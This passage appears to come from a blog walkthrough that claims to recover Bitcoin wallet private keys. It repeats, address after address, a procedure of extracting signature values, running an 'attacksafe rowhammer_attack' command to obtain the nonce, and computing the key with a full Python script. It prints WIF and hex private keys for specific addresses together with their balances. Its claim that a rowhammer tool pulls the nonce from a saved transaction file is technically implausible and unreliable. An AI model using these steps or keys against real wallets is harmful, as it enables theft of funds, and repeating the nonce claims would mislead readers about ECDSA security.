WIF:  L2vaWmjh7XpV9AMWDjmNSGPQNEd4QG7YGAMMqPEmGSt8WSppysCV
HEX:  aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/001-2.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1236"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-197-1024x458.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1373"><figcaption><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 708.02</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener"><strong>96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</strong></a>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener">1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</a></strong></p><p><a href="https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/96c94c5b69c60ab4e3889b11fee54519fc6ff0f228f37554dd0dc766ab3909ef</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-131-1024x141.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1214"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-132-1024x302.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1217"></figure>



<pre class="wp-block-code"><code>R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-135-1024x351.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1225"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-136-1024x524.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1227"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3

RawTX = 010000000104118e34a0d3c06c842d14707ed5f333d3ba1d35240086a4b5738a2fa810abec1d0000006a473044022004b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb20220282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad501210335a395eca8191c43ccee4d91e98b9baef39476d7482cf636e5b71975c69feebdffffffff014e020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-137-1024x99.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1229"></figure>



<p><code>(0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2 , 0x212c1b682ab25c069306f57725e904094c352014ea78903fbc153a129f3171e4)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
point2gen  =   (0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2 , 0x212c1b682ab25c069306f57725e904094c352014ea78903fbc153a129f3171e4)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe5fa9dccef88781e25e77bd1ea7830c0b33c57481b79007cda117da8139ea7c3
R = 0x04b1d0c7d278439811c27d9ff06b3bb0fd20d5cc90d97083266bdba7d0693bb2
S = 0x282c6cea6b9ad6f4633596204ebad4716e2a086090faf62a6908bf63a1724ad5
Z = 0x7270a25b48c53581f9babe8edcf27f9a038e7b57e817a8b242a49e2248bc71a7


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-139.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1233"></figure>



<p><code>PrivKey = aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o
WIF:  L2vaWmjh7XpV9AMWDjmNSGPQNEd4QG7YGAMMqPEmGSt8WSppysCV
HEX:  aa35fda8f16d06ae02bdcf671e03035795a0b0ecbdae45098928f6587016a932</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/001-2.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1236"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-198-1024x458.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1375"><figcaption><a href="https://www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1HhZSwcEj5ncVoPT9bAupvcEjwToY1rJ1o</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 708.02</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№2</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-99-1024x201.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1136"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-100-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1138"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/3886796f1ba39ca9c673ab969d7c9366d2d69fe9d58726f580fa02e14cca3d29</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-140-1024x143.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1242"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-144-1024x245.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1250"></figure>



<pre class="wp-block-code"><code>R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-145-1024x299.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1252"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-146-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1254"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca

RawTX = 0100000001a11dd54f81e27ca14eaf9bb4c94e6b91398130bdb09a71fa2dccf994636de08a1d0000006b483045022100f6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386022048c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-147-1024x98.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1257"></figure>



<p><code>(0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386 , 0x3f43332421ee70c0e0ccab01f0b916fdf087f1df6cd2227f6d8d7212a3e6f806)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
point2gen  =   (0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386 , 0x3f43332421ee70c0e0ccab01f0b916fdf087f1df6cd2227f6d8d7212a3e6f806)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca
R = 0xf6a4cf18e2806d4e729f7a71db5b66255499b8d25f0ee598bdf9b7b8183e4386
S = 0x48c1b699c4ac92dc3add691935b6e561d7e0ea1d7053af298c09c3e3f23e7f8f
Z = 0x51e6147848d2e81e2b6b71a5f2b29be5121752b88cc1d5e1392c001b04b4c2d9


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-148.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1259"></figure>



<p><code>PrivKey = 86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18hhdfynnojmiMmBMsrkXNFWketq4mmDHB
WIF:  L1jMLZYkKr2YoTLH9xWXS9jPMgeasnTxWmGrHBK9aMCW9ahsNDzP
HEX:  86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/002-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1263"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-150-1024x445.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1266"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 708.99</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener">18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</a></strong></p><p><a href="https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/cfc6047c1ad23ddb9d3e0151217fe62f045429ffb225e878a07a0db6f98fb9b3</a></p></blockquote>



